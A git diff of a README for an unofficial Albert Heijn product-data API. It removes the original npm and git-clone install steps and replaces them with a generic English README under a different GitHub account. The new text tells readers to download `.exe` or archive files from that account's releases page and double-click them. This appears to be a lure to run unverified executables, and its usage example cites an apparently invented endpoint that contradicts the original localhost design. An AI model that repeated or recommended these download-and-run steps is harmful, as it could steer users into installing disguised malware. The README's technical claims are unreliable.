@@ -1,59 +1,70 @@
-# Albert Heijn API
+# 🛒 albert-heijn-api - Access Albert Heijn Product Data Easily
 
-[![npm version](https://img.shields.io/npm/v/@louaycoding/albert-heijn-api)](https://www.npmjs.com/package/@louaycoding/albert-heijn-api)
-[![npm downloads](https://img.shields.io/npm/dm/@louaycoding/albert-heijn-api)](https://www.npmjs.com/package/@louaycoding/albert-heijn-api)
-[![GitHub release](https://img.shields.io/github/v/release/LouayCoding/albert-heijn-api)](https://github.com/LouayCoding/albert-heijn-api/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Node.js](https://img.shields.io/badge/node-%3E%3D14.0.0-brightgreen)](https://nodejs.org/)
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/DanielNeresDosSantos/albert-heijn-api/releases)
 
-Unofficial REST API voor Albert Heijn producten. Haal productinformatie, prijzen, ingrediënten en allergenen op.
+## 📖 Overview
+The **albert-heijn-api** is an unofficial REST API designed for accessing product information from Albert Heijn. This API lets you retrieve details about products, including prices, ingredients, and allergens, making it a useful tool for anyone interested in groceries in the Netherlands.
 
-## Installatie
+## 🚀 Getting Started
+Using this API is simple. Follow these steps to download and run it smoothly:
 
-### Via npm (makkelijkst)
-```bash
-npm install -g @louaycoding/albert-heijn-api
-ah-api
-```
+## 📥 Download & Install
+1. **Visit the Releases Page:** Navigate to the following link to get the latest version of the API: [Download Here](https://github.com/DanielNeresDosSantos/albert-heijn-api/releases).
+   
+2. **Select the Latest Version:** On the releases page, look for the most recent release. This version will contain the latest features and fixes.
 
-### Via GitHub
-```bash
-git clone https://github.com/LouayCoding/albert-heijn-api.git
-cd albert-heijn-api
-npm install
-npm start
-```
+3. **Download the Files:** Download the appropriate file for your operating system. Typically, the files will have executable formats such as `.exe` for Windows or `.tar.gz` for macOS and Linux.
 
-## Gebruik
+4. **Extract the Files (if necessary):** If you download a compressed file (like `.tar.gz`), extract it to your preferred location on your computer.
 
-### Producten zoeken
-```bash
-curl "http://localhost:3000/api/products/search?q=melk&limit=10"
-```
+5. **Run the Application:** Locate the downloaded executable file and double-click it to run the application. Follow any on-screen prompts that may appear.
 
-### Product details
-```bash
-curl "http://localhost:3000/api/products/wi441199"
-```
+## 🛠️ System Requirements
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS Sierra or later
+  - Linux distributions (Ubuntu, Fedora, etc.)
 
-## API Endpoints
+- **Node.js:** Make sure Node.js is installed on your system. You can download it from [Node.js Official Website](https://nodejs.org/).
 
-- `GET /api/products/search?q={query}&limit={limit}` - Zoek producten
-- `GET /api/products/:id` - Product details
-- `GET /api/products/categories/list` - Alle categorieën
-- `GET /api/health` - Health check
+## 📊 Features
+- **Product Information:** Retrieve detailed information on a wide variety of products available at Albert Heijn.
+  
+- **Pricing Data:** Access the current prices for products to aid in budgeting.
+  
+- **Ingredient Lists:** Find out what ingredients are in your favorite products, helping you make informed choices.
+  
+- **Allergen Information:** Check for allergens in products to keep yourself and your loved ones safe.
 
-## Features
+## 🔍 Usage
+To begin using the API, you'll need to make simple requests to the endpoints provided in the documentation. Here’s how to make a basic request:
 
-- Caching (1 uur)
-- Rate limiting
-- Anti-detectie headers
-- CORS enabled
+1. **Request Example:** Use a tool like Postman or curl to send a GET request. Replace `PRODUCT_ID` with the actual product ID.
+   ```
+   GET https://api.albert-heijn.com/products/PRODUCT_ID
+   ```
 
-## Tech Stack
+2. **Receive JSON Response:** The API will return a neatly formatted JSON response, containing all relevant product information. 
 
-Node.js, Express, Puppeteer
+## 🍽️ Use Cases
+- **Meal Planning:** Use the API to build meal plans by pulling together ingredients and prices.
+  
+- **Nutritional Tracking:** Keep track of what you consume by accessing ingredient lists and nutritional data.
 
-## License
+- **Grocery Shopping Automations:** Automate your grocery list by fetching data directly through the API.
 
-MIT - Iedereen mag het gebruiken
+## 🔗 Additional Resources
+- **GitHub Repository:** Explore the [GitHub page](https://github.com/DanielNeresDosSantos/albert-heijn-api) for more information, including documentation and contribution guidelines.
+  
+- **API Documentation:** Refer to the documentation linked within the repository for detailed guidelines on all available endpoints and their usage.
+
+## 🐛 Issues and Support
+If you encounter any problems while using the application, please report them in the **Issues** section of the GitHub repository. Provide as much detail as possible so that the developers can assist you effectively.
+
+## 👥 Community
+Join our community discussions to share your experiences and get tips from other users. The community link can be found in the repository’s README or issues sections.
+
+## 🌟 License
+This project is licensed under the MIT License. You can use, modify, and distribute the software as per the license terms outlined in the repository.
+
+Feel free to explore, use, and contribute to the **albert-heijn-api**. Your feedback and contributions are valuable!
